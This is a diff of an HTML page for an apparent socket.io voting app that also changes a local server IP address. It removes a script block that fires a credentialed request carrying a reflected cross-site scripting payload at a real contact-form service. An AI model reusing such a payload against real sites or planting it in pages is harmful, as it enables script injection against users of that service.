@@ -12,29 +12,12 @@
 <body>
 
 
-  <script>
-  function submitRequest()
-  {
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "http://www.123contactform.com/sfnew2.php?redirect=false&action=showreports&quot;><script>prompt()</script>20formaction321&s=1282550&rid=21330&disable_cdn_usage=yes", true);
-    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
-    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.8");
-    xhr.withCredentials = true;
-    var body = "";
-    var aBody = new Uint8Array(body.length);
-    for (var i = 0; i < aBody.length; i++)
-      aBody[i] = body.charCodeAt(i);
-    xhr.send(new Blob([aBody]));
-  }
-</script>
-<form action="#">
-  <input type="button" value="Submit request" onclick="submitRequest();" />
-</form>
+
 
     <div id="app"></div>
     <script src="http://localhost:3000/socket.io/socket.io.js"></script>
     <script>
-            socket_vote = io.connect("10.1.1.222:3000");
+            socket_vote = io.connect("10.1.1.51:3000");
 
         /*  Websocket
              websocket = new WebSocket("ws://echo.websocket.org/");
